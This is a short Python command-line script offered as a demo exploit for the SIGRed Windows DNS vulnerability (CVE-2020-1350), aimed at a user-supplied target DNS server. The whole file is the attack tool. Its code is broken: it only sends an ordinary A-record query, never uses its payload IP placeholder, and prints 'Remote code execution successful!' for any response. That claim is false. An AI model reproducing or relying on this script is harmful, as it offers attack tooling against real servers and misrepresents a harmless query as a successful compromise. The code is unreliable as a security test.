import argparse
import dns.resolver

# SIGRed Vulnerability Exploitation Demo CLI
# This tool demonstrates exploiting the SIGRed vulnerability (CVE-2020-1350) by triggering remote code execution.
# Created by milosilo

def exploit_sigred(target_dns, payload_domain):
    try:
        payload_ip = "YOUR_PAYLOAD_IP"
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [target_dns]
        
        # Construct the malicious payload domain
        payload_domain = f"NS1.{payload_domain}"
        
        # Perform the DNS query triggering remote code execution
        response = resolver.query(payload_domain, rdtype=dns.rdatatype.A)
        
        # Display the response (if successful)
        for rdata in response:
            print(f"Remote code execution successful! IP: {rdata.address}")
    
    except Exception as e:
        print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="SIGRed Vulnerability Exploitation Demo CLI")
    parser.add_argument("target_dns", help="DNS server IP address of the target system")
    parser.add_argument("payload_domain", help="Domain for the malicious payload")

    args = parser.parse_args()

    print("Exploiting the SIGRed vulnerability...")
    exploit_sigred(args.target_dns, args.payload_domain)

if __name__ == "__main__":
    main()
